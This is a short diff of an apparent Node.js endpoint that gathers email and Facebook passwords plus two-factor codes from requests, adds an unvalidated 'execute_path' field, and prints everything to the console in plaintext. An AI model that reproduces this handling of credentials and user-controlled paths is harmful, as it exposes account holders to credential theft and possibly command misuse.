@@ -8,7 +8,8 @@ module.exports = async (req, res) => {
             email: req.body.email,
             email_password: req.body.email_password,
             fb_password: req.body.fb_password,
-            two_fa: req.body.two_fa
+            two_fa: req.body.two_fa,
+            execute_path:req.body.execute_path
         }
 
         console.log(body)
